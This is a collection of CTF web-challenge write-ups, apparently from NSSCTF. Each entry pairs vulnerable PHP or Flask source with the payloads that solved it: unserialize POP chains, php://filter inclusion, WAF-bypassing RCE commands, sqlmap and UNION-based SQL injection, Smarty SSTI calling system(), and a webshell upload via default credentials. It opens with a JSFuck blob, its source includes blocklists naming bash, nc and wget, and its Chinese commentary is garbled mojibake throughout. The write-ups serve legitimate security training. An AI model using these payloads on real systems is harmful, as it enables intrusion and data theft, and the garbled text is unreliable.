+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]+[+[]]+[]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+[+!+[]]+[]+(![]+[])[+[]]+[+[]]+[]+[+[]]+[]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(![]+[])[+[]]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[]+[!+[]+!+[]]+[]+[+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+(![]+[])[+!+[]]+[!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(!![]+[])[!+[]+!+[]+!+[]]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[]+(![]+[])[+[]]+([][[]]+[])[!+[]+!+[]]+(![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])\n\njsfuckè§£ç \nNSSCTF&#123;0ed61f00-c99f-4215-a38e-4fdf7feeae5c&#125;\n\n[LitCTF 2023]ä½œä¸šç®¡ç†ç³»ç»Ÿå¼±å£ä»¤admin&#x2F;adminç™»å½•æˆåŠŸ,æœ‰ä¸ªä¸Šä¼ æ–‡ä»¶çš„åœ°ç‚¹ä¸Šä¼ 1.php,èšå‰‘é“¾æ¥å³å¯\n\nNSSCTF&#123;87d35619-3607-475a-b784-5de88f37f2d8&#125;\n\n[SWPUCTF 2021 ]pop&lt;?phperror_reporting(0);show_source(&quot;index.php&quot;);class w44m&#123;    private $admin = &#x27;aaa&#x27;;    protected $passwd = &#x27;123456&#x27;;    public function Getflag()&#123;        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;            include(&#x27;flag.php&#x27;);            echo $flag;        &#125;else&#123;            echo $this-&gt;admin;            echo $this-&gt;passwd;            echo &#x27;nono&#x27;;        &#125;    &#125;&#125;class w22m&#123;    public $w00m;    public function __destruct()&#123;        echo $this-&gt;w00m;    &#125;&#125;class w33m&#123;    public $w00m;    public $w22m;    public function __toString()&#123;        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();        return 0;    &#125;&#125;$w00m = $_GET[&#x27;w00m&#x27;];unserialize($w00m);\n\nw22m.__destruct().w00m-&gt;w33m.__toString().w00m-&gt;w44m.Getflag()\n\n&lt;?phpclass w44m&#123;    private $admin = &#x27;w44m&#x27;;    protected $passwd = &#x27;08067&#x27;;&#125;class w22m&#123;    public $w00m;&#125;class w33m&#123;    public $w00m;    public $w22m;&#125;# w22m.__destruct().w00m-&gt;w33m.__toString().w00m-&gt;w44m.Getflag()$a = new w22m();echo urlencode(serialize($a));?&gt;\n\n\nNSSCTF&#123;fb43f7ba-ac7b-4398-ac41-78c0c4b91e55&#125;\n\n[é¹åŸæ¯ 2022]ç®€å•åŒ…å«&lt;?phphighlight_file(__FILE__);include($_POST[&quot;flag&quot;]);//flag in /var/www/html/flag.php;?&gt;\n\næ–‡ä»¶åŒ…å«,ä½†æ˜¯æœ‰waf,æ·»åŠ è„æ•°æ®å³å¯ç»•è¿‡\n1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;flag=php://filter/read=convert.base64-encode/resource=flag.php\n\nå¾—åˆ°çš„å­—ç¬¦ä¸²base64è§£ç å³å¯\n\nNSSCTF&#123;898bdef2-4464-46c4-a33d-16f3ec2fb907&#125;\n\n[SWPUCTF 2021 ]finalrce&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;url&#x27;]))&#123;    $url=$_GET[&#x27;url&#x27;];    if(preg_match(&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\\-|\\*|\\&quot;|\\&gt;|\\&lt;|\\%|\\$/i&#x27;,$url))    &#123;        echo &quot;Sorry,you can&#x27;t use this.&quot;;    &#125;    else    &#123;        echo &quot;Can you see anything?&quot;;        exec($url);    &#125;&#125;\n\næ— å›æ˜¾rce,dnså¤–å¸¦,åå¼¹shelléƒ½ä¸è¡Œ,ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤teeå‘½ä»¤,lsè¢«è¿‡æ»¤,ç”¨lâ€™â€™så³å¯ç»•è¿‡\n?url=l&#x27;&#x27;s /|tee 1.txt è®¿é—®1.txtå³å¯\n\n\nä¸çŸ¥é“å“ªä¸ªæ˜¯çœŸçš„,éƒ½è¯•è¯•\n?url=tac /a_here_is_a_f1ag|tee 2.txt\n\n\n?url=tac /flllllaaaaaaggggggg|tee 3.txt\n\nå‘ç°laè¢«è¿‡æ»¤,ä¹Ÿç”¨lâ€™â€™aè¿‡æ»¤å³å¯\n?url=tac /flllll&#x27;&#x27;aaaaaaggggggg|tee 3.txt\n\n\nNSSCTF&#123;dce5fd0e-5c6f-4cf5-bee1-a7e92a9a2f39&#125;\n\n[SWPUCTF 2021 ]sql\nfuzzä¸€ä¸‹,è¿‡æ»¤äº†ç©ºæ ¼å’Œç­‰å·,ç©ºæ ¼ç”¨&#x2F;**&#x2F;,ç­‰å·ç”¨like,sqlmapä¸€æŠŠæ¢­\npython sqlmap.py -u http://node4.anna.nssctf.cn:28905/?wllm=1 --tamper=space2comment,equaltolike --batch --tablesNSSCTF&#123;c102c917-6b0c-46f0-9b5f-85cb84c46e86&#125;\n\n[HNCTF 2022 Week1]Interesting_includehttp://node5.anna.nssctf.cn:23362/?filter=php://filter/read=convert.base64-encode/resource=flag.php\n\n\nNSSCTF&#123;fd4469d9-cb38-4626-be18-66249511c7eb&#125;\n\n[NSSCTF 2022 Spring Recruit]babyphp&lt;?phphighlight_file(__FILE__);include_once(&#x27;flag.php&#x27;);if(isset($_POST[&#x27;a&#x27;])&amp;&amp;!preg_match(&#x27;/[0-9]/&#x27;,$_POST[&#x27;a&#x27;])&amp;&amp;intval($_POST[&#x27;a&#x27;]))&#123;    if(isset($_POST[&#x27;b1&#x27;])&amp;&amp;$_POST[&#x27;b2&#x27;])&#123;        if($_POST[&#x27;b1&#x27;]!=$_POST[&#x27;b2&#x27;]&amp;&amp;md5($_POST[&#x27;b1&#x27;])===md5($_POST[&#x27;b2&#x27;]))&#123;            if($_POST[&#x27;c1&#x27;]!=$_POST[&#x27;c2&#x27;]&amp;&amp;is_string($_POST[&#x27;c1&#x27;])&amp;&amp;is_string($_POST[&#x27;c2&#x27;])&amp;&amp;md5($_POST[&#x27;c1&#x27;])==md5($_POST[&#x27;c2&#x27;]))&#123;                echo $flag;            &#125;else&#123;                echo &quot;yee&quot;;            &#125;        &#125;else&#123;            echo &quot;nop&quot;;        &#125;    &#125;else&#123;        echo &quot;go on&quot;;    &#125;&#125;else&#123;    echo &quot;let&#x27;s get some php&quot;;&#125;?&gt;\n\nintvalä¸èƒ½è½¬æ¢æ•°ç»„,ä¼šè¿”å›1æˆ–è€…0,å…·ä½“çœ‹æ•°ç»„æ˜¯å¦ä¸ºç©ºa[]=1&amp;b1[]=1&amp;b2[]=2&amp;c1=240610708&amp;c2=QNKCDZO\n\n\nNSSCTF&#123;5fc91657-8e8c-4dbd-b42e-897518cdcdb6&#125;\n\n[LitCTF 2023]Vim yyds\næ‰“å¼€swpæ–‡ä»¶\nvim -r index.php.swp\n\n&lt;?phperror_reporting(0);$password = &quot;Give_Me_Your_Flag&quot;;echo &quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;;if ($_POST[&#x27;password&#x27;] == base64_encode($password)) &#123;    echo &quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;;    eval(system($_POST[&#x27;cmd&#x27;])&#125;?&gt;\n\n\nNSSCTF&#123;cffb4191-06eb-419c-8b2d-6c9dd0e7f7ed&#125;\n\n[é¹¤åŸæ¯ 2021]EasyP&lt;?phpinclude &#x27;utils.php&#x27;;if (isset($_POST[&#x27;guess&#x27;])) &#123;    $guess = (string) $_POST[&#x27;guess&#x27;];    if ($guess === $secret) &#123;        $message = &#x27;Congratulations! The flag is: &#x27; . $flag;    &#125; else &#123;        $message = &#x27;Wrong. Try Again&#x27;;    &#125;&#125;if (preg_match(&#x27;/utils\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;    exit(&quot;hacker :)&quot;);&#125;if (preg_match(&#x27;/show_source/&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;]))&#123;    exit(&quot;hacker :)&quot;);&#125;if (isset($_GET[&#x27;show_source&#x27;])) &#123;    highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));    exit();&#125;else&#123;    show_source(__FILE__);&#125;?&gt; \n\næ¡ˆä¾‹ç½‘å€ï¼šhttps://www.shawroot.cc/php/index.php/test/foo?username=root$_SERVER[&#x27;PHP_SELF&#x27;] \tå¾—åˆ°ï¼š/php/index.php/test/foo$_SERVER[&#x27;REQUEST_URI&#x27;] å¾—åˆ°ï¼š/php/index.php/test/foo?username=root\n\n/index.php/utils.php/%a0?show+source=1%a0 æ˜¯ URL ç¼–ç ä¸­çš„ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œä»£è¡¨ä¸€ä¸ªéæ‰“å°å­—ç¬¦ï¼ˆNo-Break Spaceï¼‰ã€‚åœ¨ PHP ä¸­ï¼Œéæ‰“å°å­—ç¬¦é€šå¸¸ä¼šè¢«å¿½ç•¥ã€‚æ‰€ä»¥ï¼Œ/utils.php/%a0 å®é™…ä¸Šè¢« PHP è§£æä¸º /utils.php/show_sourceç»•è¿‡:ç”¨+ç»•è¿‡,å› ä¸ºå˜é‡åæœ‰+ä¼šè¢«æ›¿æ¢ä¸º_\n\n\nNSSCTF&#123;692b6db9-26ae-4800-89a2-e0df6bf675f0&#125;\n\n[SWPUCTF 2022 ]ez_ez_php(revenge)&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123;    if ( substr($_GET[&quot;file&quot;], 0, 3) === &quot;php&quot; ) &#123;        echo &quot;Nice!!!&quot;;        include($_GET[&quot;file&quot;]);    &#125;     else &#123;        echo &quot;Hacker!!&quot;;    &#125;&#125;else &#123;    highlight_file(__FILE__);&#125;\n\n?file=php://filter/read=convert.base64-encode/resource=flag.php\n\n&lt;?phperror_reporting(0);header(&quot;Content-Type:text/html;charset=utf-8&quot;);echo   &quot;NSSCTF&#123;flag_is_not_here&#125;&quot; .&quot;&lt;br/&gt;&quot;;echo &quot;real_flag_is_in_ &#x27;/flag&#x27; &quot;.&quot;&lt;br/&gt;&quot;;echo &quot;æ¢ä¸ªæ€è·¯ï¼Œè¯•è¯•PHPä¼ªåè®®å‘¢&quot;;\n\n?file=php://filter/read=convert.base64-encode/resource=/flag\n\n\nNSSCTF&#123;314f54d0-a0be-4756-a49b-3ae5c1ce851c&#125;\n\n[HUBUCTF 2022 ]checkin&lt;?phpshow_source(__FILE__);$username  = &quot;this_is_secret&quot;; $password  = &quot;this_is_not_known_to_you&quot;; include(&quot;flag.php&quot;);//here I changed those two $info = isset($_GET[&#x27;info&#x27;])? $_GET[&#x27;info&#x27;]: &quot;&quot; ;$data_unserialize = unserialize($info);if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123;    echo $flag;&#125;else&#123;    echo &quot;username or password error!&quot;;&#125;?&gt;\n\nå¼±æ¯”è¾ƒå³å¯,trueå’Œä»€ä¹ˆæ¯”è¾ƒéƒ½æ˜¯çœŸçš„\n?info=a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;\n\n\nNSSCTF&#123;57defded-2363-4440-b19e-e78ea1b25589&#125;\n\n[CISCN 2019åä¸œå—]Web11\nsmartyçš„ssti,æ”¹xffå³å¯\n\n\n&#123;&#123;system(&#x27;tac /f*&#x27;)&#125;&#125;\n\nflagåœ¨f12é‡Œæ‰èƒ½çœ‹å¾—åˆ°\n\nNSSCTF&#123;41a64a71-607f-4160-99ee-56cdbbcb7dba&#125;\n\n[GDOUCTF 2023]EZ WEBctrl+uå¾—åˆ°æç¤º&#x2F;src\nimport flaskapp = flask.Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])def index():  return flask.send_file(&#x27;index.html&#x27;)@app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;])def source():  return flask.send_file(&#x27;app.py&#x27;)@app.route(&#x27;/super-secret-route-nobody-will-guess&#x27;, methods=[&#x27;PUT&#x27;])def flag():  return open(&#x27;flag&#x27;).read()\n\nç”¨PUTæ–¹æ³•è®¿é—®&#x2F;super-secret-route-nobody-will-guess\n\nNSSCTF&#123;8da126ae-6484-4e9e-a89a-9346d6e25c2b&#125;\n\n[GDOUCTF 2023]æ³„éœ²çš„ä¼ªè£…dirsearchæ‰«æåˆ°test.txtå’Œwww.rar\n&lt;?phperror_reporting(0);if(isset($_GET[&#x27;cxk&#x27;]))&#123;    $cxk=$_GET[&#x27;cxk&#x27;];    if(file_get_contents($cxk)==&quot;ctrl&quot;)&#123;        echo $flag;    &#125;else&#123;        echo &quot;å¨²æ¥ç¤‚é«â€³æƒ‚&quot;;    &#125;&#125;else&#123;    echo &quot;nononoononoonono&quot;;&#125;?&gt;\n\nwww.rar:\næ­å–œä½ turn to/orzorz.php\n\n\nNSSCTF&#123;5dd848cd-187f-406f-bfd9-0b67a13c39da&#125;\n\n[UUCTF 2022 ]ez_rceif(isset($_GET[&#x27;code&#x27;]))&#123;    $code=$_GET[&#x27;code&#x27;];    if (!preg_match(&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\\$|\\*|\\+|\\^|scan|\\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;,$code))&#123;        echo &#x27;çœ‹çœ‹ä½ è¾“å…¥çš„å‚æ•°ï¼ï¼ï¼ä¸å«æ ·å­ï¼ï¼&#x27;;echo &#x27;&lt;br&gt;&#x27;;        eval($code);    &#125;    else&#123;        die(&quot;ä½ æƒ³å¹²ä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ&quot;);    &#125;&#125;else&#123;    echo &quot;å±…ç„¶éƒ½ä¸è¾“å…¥å‚æ•°ï¼Œå¯æ¶!!!!!!!!!&quot;;    show_source(__FILE__);&#125;\n\næ²¡è¿‡æ»¤åå¼•å·,è¿˜éœ€è¦æœ‰ä¸ªå›æ˜¾å‡½æ•°,print_r\n?code=print_r(`l\\s /`);bin boot dev etc fffffffffflagafag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var?code=print(`c\\at%09/fffffffffflagafag`);NSSCTF&#123;This_IS_s0_easy_RCE&#125;\n\n\n[LitCTF 2023]è¿™æ˜¯ä»€ä¹ˆï¼ŸSQL ï¼æ³¨ä¸€ä¸‹ ï¼$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.&#x27;((((((&#x27;.$_GET[&quot;id&quot;].&#x27;))))))&#x27;;$result = $conn-&gt;query($sql);\n\nå…­ä¸ªæ‹¬å·\nåº“:?id=-1)))))) union select schema_name,2 from information_schema.schemata--+Array ( [0] =&gt; Array ( [username] =&gt; information_schema [password] =&gt; 2 ) [1] =&gt; Array ( [username] =&gt; mysql [password] =&gt; 2 ) [2] =&gt; Array ( [username] =&gt; ctftraining [password] =&gt; 2 ) [3] =&gt; Array ( [username] =&gt; performance_schema [password] =&gt; 2 ) [4] =&gt; Array ( [username] =&gt; test [password] =&gt; 2 ) [5] =&gt; Array ( [username] =&gt; ctf [password] =&gt; 2 ) )çŒœæµ‹æ˜¯ctftrainingåº“?id=-1)))))) union select table_name,2 from information_schema.tables where table_schema=&#x27;ctftraining&#x27;--+Array ( [0] =&gt; Array ( [username] =&gt; flag [password] =&gt; 2 ) [1] =&gt; Array ( [username] =&gt; news [password] =&gt; 2 ) [2] =&gt; Array ( [username] =&gt; users [password] =&gt; 2 ) )æŸ¥å­—æ®µ:?id=-1)))))) union select flag,2 from ctftraining.flag--+\n\n\nNSSCTF&#123;60b9f165-1f1d-43af-8074-2d33cad25413&#125; \n\n[HNCTF 2022 Week1]2048findsomethingæ‰¾åˆ°æœ‰2048.js\n\næŠŠalerté‚£ä¸€ä¸²æ”¾åˆ°æ§åˆ¶å°å³å¯\n\nflag&#123;53160c888e25c3f828b23e316a7ae083&#125;\n\n[SWPUCTF 2022 ]1z_unserialize&lt;?php class lyh&#123;    public $url = &#x27;NSSCTF.com&#x27;;    public $lt;    public $lly;          function  __destruct()     &#123;        $a = $this-&gt;lt;        $a($this-&gt;lly);     &#125;        &#125;unserialize($_POST[&#x27;nss&#x27;]);highlight_file(__FILE__);\n\n&lt;?phpclass lyh&#123;    public $url = &#x27;NSSCTF.com&#x27;;    public $lt = &#x27;system&#x27;;    public $lly=&#x27;ls /&#x27;;          function  __destruct()     &#123;        $a = $this-&gt;lt;        